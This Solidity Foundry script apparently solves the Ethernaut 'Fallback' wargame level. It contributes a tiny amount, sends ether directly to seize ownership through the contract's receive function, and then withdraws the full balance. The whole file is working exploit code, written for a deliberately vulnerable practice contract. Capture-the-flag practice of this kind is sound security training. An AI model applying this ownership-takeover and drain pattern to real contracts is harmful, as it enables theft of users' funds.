// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";

interface IFallbackContract {
    function contributions(address) external returns(uint256);
    function owner() external returns(address);
    function contribute() external payable;
    function getContribution() external view returns (uint256);
    function withdraw() external;
}

contract FallbackScript is Script {

    address constant FALLBACK_ADDRESS = address(0xcd71D3eB43de6D6F914807f2198e91686bE7981b);
    IFallbackContract public fallbackContract = IFallbackContract(payable(FALLBACK_ADDRESS));

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("1. Current owner is", fallbackContract.owner());

        // Contribute in order to pass validation in 
        // the receive method contributions[msg.sender] > 0
        fallbackContract.contribute{value: 1e1}();

        // Take ownership of the contract by sending very small amount of ether 
        (bool success, ) = address(FALLBACK_ADDRESS).call{value: 1e1}("");

        if (success) {
            console.log("2. New owner is", fallbackContract.owner());

            // After we are already the owner we can withraw all the ethers
            fallbackContract.withdraw();
            console.log("3. Wallet's balance", vm.envAddress("WALLLET_ADDRESS").balance);
            console.log("4. Contract's balance", address(fallbackContract).balance);
        }
        vm.stopBroadcast();
    }
}
